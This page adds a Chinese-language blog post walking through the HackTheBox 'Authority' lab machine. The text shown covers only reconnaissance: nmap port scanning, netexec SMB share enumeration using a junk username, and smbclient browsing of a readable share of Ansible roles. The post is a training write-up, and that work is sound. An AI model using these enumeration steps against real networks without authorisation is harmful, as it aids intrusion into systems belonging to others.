@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="简述本文是medium难度的HTB authority机器的域渗透部分，其中ansible hash crack + ESC1 attack + pass-the-cert attack等域渗透只是细节是此box的特色，主要参考0xdf’s blog authority walkthrough和HTB的authority官方writeup paper记录这篇博客加深记忆和理解，及供后续做深入研究查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack]">
+<meta property="og:url" content="https://fdlucifer.github.io/2023/12/11/htb-authority/index.html">
+<meta property="og:site_name" content="fdvoid0&#39;s blog">
+<meta property="og:description" content="简述本文是medium难度的HTB authority机器的域渗透部分，其中ansible hash crack + ESC1 attack + pass-the-cert attack等域渗透只是细节是此box的特色，主要参考0xdf’s blog authority walkthrough和HTB的authority官方writeup paper记录这篇博客加深记忆和理解，及供后续做深入研究查">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority5.png">
+<meta property="article:published_time" content="2023-12-11T05:50:55.000Z">
+<meta property="article:modified_time" content="2023-12-11T09:39:56.381Z">
+<meta property="article:author" content="fdvoid0">
+<meta property="article:tag" content="DC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority.png">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2023/12/11/htb-authority/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2023/12/11/htb-authority/","path":"2023/12/11/htb-authority/","title":"HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack] | fdvoid0's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">fdvoid0's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">49</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">210</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB-TCP-445"><span class="nav-number">2.2.</span> <span class="nav-text">SMB - TCP 445</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-TCP-x2F-UDP-53"><span class="nav-number">2.3.</span> <span class="nav-text">DNS - TCP &#x2F; UDP 53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Website-TCP-80"><span class="nav-number">2.4.</span> <span class="nav-text">Website - TCP 80</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWM-TCP-8443"><span class="nav-number">2.5.</span> <span class="nav-text">PWM - TCP 8443</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-svc-ldap"><span class="nav-number">3.</span> <span class="nav-text">Shell as svc_ldap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Ansible-%E6%96%87%E4%BB%B6"><span class="nav-number">3.1.</span> <span class="nav-text">Ansible 文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D%E5%AF%86%E7%A0%81"><span class="nav-number">3.2.</span> <span class="nav-text">恢复密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8F%96-LDAP-Creds"><span class="nav-number">3.3.</span> <span class="nav-text">抓取 LDAP Creds</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WinRM-shell"><span class="nav-number">3.4.</span> <span class="nav-text">WinRM shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-administrator"><span class="nav-number">4.</span> <span class="nav-text">Shell as administrator</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">4.1.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ESC1"><span class="nav-number">4.2.</span> <span class="nav-text">ESC1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference-Sources"><span class="nav-number">5.</span> <span class="nav-text">Reference Sources</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fdvoid0"
+      src="/images/blackhole.png">
+  <p class="site-author-name" itemprop="name">fdvoid0</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">210</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">49</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2023/12/11/htb-authority/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blackhole.png">
+      <meta itemprop="name" content="fdvoid0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fdvoid0's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack] | fdvoid0's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox Authority [ansible hash crack + ESC1 attack + pass-the-cert attack]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2023-12-11 13:50:55 / Modified: 17:39:56" itemprop="dateCreated datePublished" datetime="2023-12-11T13:50:55+08:00">2023-12-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ansible-hash-crack/" itemprop="url" rel="index"><span itemprop="name">ansible hash crack</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ansible-hash-crack/ESC1-attack/" itemprop="url" rel="index"><span itemprop="name">ESC1 attack</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ansible-hash-crack/ESC1-attack/pass-the-cert-attack/" itemprop="url" rel="index"><span itemprop="name">pass-the-cert attack</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3.2k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>12 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>本文是medium难度的HTB authority机器的域渗透部分，其中ansible hash crack + ESC1 attack + pass-the-cert attack等域渗透只是细节是此box的特色，主要参考<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzEyLzA5L2h0Yi1hdXRob3JpdHkuaHRtbA==">0xdf’s blog authority walkthrough<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5jb20vbWFjaGluZXMvQXV0aG9yaXR5L3dyaXRldXBz">HTB的authority官方writeup paper<i class="fa fa-external-link-alt"></i></span>记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Authority.png"></li>
+</ul>
+<span id="more"></span>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  nmap -v -sV -p- --min-rate=10000 10.10.11.222</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-11 09:59:06Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">8443/tcp  open  ssl/https-alt</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49689/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49700/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49709/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49716/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49735/tcp open  msrpc         Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>一级枚举:</li>
+</ul>
+<p>SMB (445)<br>DNS (53)<br>HTTP (80) &#x2F; HTTPS (8443)</p>
+<ul>
+<li>二级枚举:</li>
+</ul>
+<p>Kerberos (88)<br>LDAP (389, others)<br>RPC (135)</p>
+<ul>
+<li>如果找到密码凭证信息:</li>
+</ul>
+<p>WinRM (5985)</p>
+<h2 id="SMB-TCP-445"><a href="#SMB-TCP-445" class="headerlink" title="SMB - TCP 445"></a>SMB - TCP 445</h2><p>Netexec(前身是crackmapexec)显示authority.htb的域名和hostname:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec smb 10.10.11.222</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br></pre></td></tr></table></figure>
+
+<p>如果尝试不用creds列出creds，失败，但可以使用一些垃圾creds:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec smb 10.10.11.222 --shares</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [-] Error getting user: list index out of range</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED</span><br><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  netexec smb 10.10.11.222 -u fdvoid0 -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\fdvoid0:</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        C$                              Default share</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        Department Shares</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        Development     READ</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share</span><br><span class="line">SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share</span><br></pre></td></tr></table></figure>
+
+<p>“Department Shares” 共享没有权限.</p>
+<p>能访问的共享是”Development”。它有一个单一的目录Automation\Ansible，它有四个目录:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  ~/hackthebox/machine/authority  smbclient -N //10.10.11.222/Development</span><br><span class="line">Can<span class="string">&#x27;t load /etc/samba/smb.conf - run testparm to debug it</span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls Automation\Ansible\</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Mar 17 09:20:50 2023</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Mar 17 09:20:50 2023</span></span><br><span class="line"><span class="string">  ADCS                                D        0  Fri Mar 17 09:20:48 2023</span></span><br><span class="line"><span class="string">  LDAP                                D        0  Fri Mar 17 09:20:48 2023</span></span><br><span class="line"><span class="string">  PWM                                 D        0  Fri Mar 17 09:20:48 2023</span></span><br><span class="line"><span class="string">  SHARE                               D        0  Fri Mar 17 09:20:48 2023</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                5888511 blocks of size 4096. 1518451 blocks available</span></span><br></pre></td></tr></table></figure>
+
+<p>每个都有一个Ansible设置。例如，ADCS:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; <span class="built_in">ls</span> Automation\Ansible\ADCS\</span><br><span class="line">  .                                   D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  ..                                  D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  .ansible-lint                       A      259  Thu Sep 22 01:34:12 2022</span><br><span class="line">  .yamllint                           A      205  Tue Sep  6 12:07:26 2022</span><br><span class="line">  defaults                            D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  LICENSE                             A    11364  Tue Sep  6 12:07:26 2022</span><br><span class="line">  meta                                D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  molecule                            D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  README.md                           A     7279  Tue Sep  6 12:07:26 2022</span><br><span class="line">  requirements.txt                    A      466  Tue Sep  6 12:07:26 2022</span><br><span class="line">  requirements.yml                    A      264  Tue Sep  6 12:07:26 2022</span><br><span class="line">  SECURITY.md                         A      924  Tue Sep  6 12:07:26 2022</span><br><span class="line">  tasks                               D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  templates                           D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line">  tox.ini                             A      419  Tue Sep  6 12:07:26 2022</span><br><span class="line">  vars                                D        0  Fri Mar 17 09:20:48 2023</span><br><span class="line"></span><br><span class="line">                5888511 blocks of size 4096. 1518420 blocks available</span><br></pre></td></tr></table></figure>
+
+<p>Active Directory证书服务(ADCS)是一个很有价值的目标，但没有creds做不了什么。注意到这一点，作为再次检查的提示。</p>
